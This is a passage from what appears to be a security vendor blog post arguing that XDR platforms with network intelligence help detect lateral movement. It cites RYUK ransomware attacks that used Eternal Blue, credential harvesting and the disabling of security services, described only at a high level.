This is where adding network intelligence to an XDR and correlating with other intelligence from different areas of the network can be most beneficial.
An XDR that supports advanced detection capabilities can identify correlate data across areas to identify events that would otherwise go unnoticed.
"Additionally, in many attacks the malicious actors are removing their tracks once finished with that area, so having the ability to capture and keep intelligence can help with root cause analysis and correlate the different disparate components of an attack."
This correlation allows an organization to put the pieces of the attack puzzle together to see the full picture.
Some recent RYUK ransomware attacks are a good example.
"In these attacks, attackers utilized the Eternal Blue exploit and harvested credentials as they moved across the environment, and then used existing system tools to kill security services within machines to hide their presence."
"In both cases the intelligence coming from endpoints, servers, and the network allowed researchers to identify the attack chain and all the components used within the attack."
"Most attacks today, including ransomware, are utilizing lateral movement."
"Including detection of this as part of an overall XDR platform will improve the prevention, detection, and remediation of sophisticated attacks on an organization."
Stay tuned for more upcoming blogs on how XDR will help improve our overall security strategy moving forward.
Tags Cloud | APT & Targeted Attacks | Cyber Crime | Expert Perspective | Cyber Threats
